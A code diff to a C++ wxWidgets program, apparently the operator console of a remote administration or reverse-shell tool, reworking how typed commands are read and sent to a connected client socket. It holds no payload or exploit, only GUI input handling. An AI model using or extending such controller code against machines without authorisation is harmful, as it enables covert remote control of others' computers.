@@ -15,11 +15,6 @@ wxBEGIN_EVENT_TABLE(FrameCliente, wxFrame)
     EVT_AUINOTEBOOK_PAGE_CLOSE(wxID_ANY, FrameCliente::OnClosePage)
 wxEND_EVENT_TABLE()
 
-wxBEGIN_EVENT_TABLE(MyListCtrl, wxListCtrl)
-    EVT_CONTEXT_MENU(MyListCtrl::OnContextMenu)
-    EVT_MENU(EnumIDS::ID_Interactuar, MyListCtrl::OnInteractuar)
-wxEND_EVENT_TABLE()
-
 wxBEGIN_EVENT_TABLE(MyTreeCtrl, wxTreeCtrl)
     EVT_TREE_ITEM_ACTIVATED(EnumIDS::TreeCtrl_ID, MyTreeCtrl::OnItemActivated)
 wxEND_EVENT_TABLE()
@@ -234,14 +229,13 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
             std::cout << "HISTORIAL: [" << this->iHistorialPos << "] " << strTmp << std::endl;
             
         }
+
     }else if (iCode == WXK_RETURN) {
-        wxString strRandomOut = this->txtConsole->GetLineText(this->txtConsole->GetNumberOfLines()-1);
-        int iLongitud = this->txtConsole->GetLastPosition() - this->p_uliUltimo;
+        wxString strCmdLine = this->txtConsole->GetRange(this->p_uliUltimo, this->txtConsole->GetLastPosition());
         wxString str1 = std::to_string(EnumComandos::Reverse_Shell_Command);
         str1 += CMD_DEL;
-        wxString str2 = strRandomOut.substr((strRandomOut.length() - iLongitud), strRandomOut.length());
-        str1 += str2;
-        this->vc_History.push_back(str2);
+        str1 += strCmdLine;
+        this->vc_History.push_back(strCmdLine);
 
         str1.append(1, '\r');
         str1.append(1, '\n');
@@ -251,8 +245,7 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
         strComando += "0";
         p_Servidor->cSend(this->sckCliente, str1.c_str(), str1.size()+1, 0, false);
         
-        this->p_uliUltimo = this->txtConsole->GetLastPosition() + 2;
-          
+        this->p_uliUltimo = this->txtConsole->GetLastPosition() + 1;
         event.Skip();
     } else {
         if (this->txtConsole->GetInsertionPoint() < this->txtConsole->GetLastPosition()) {
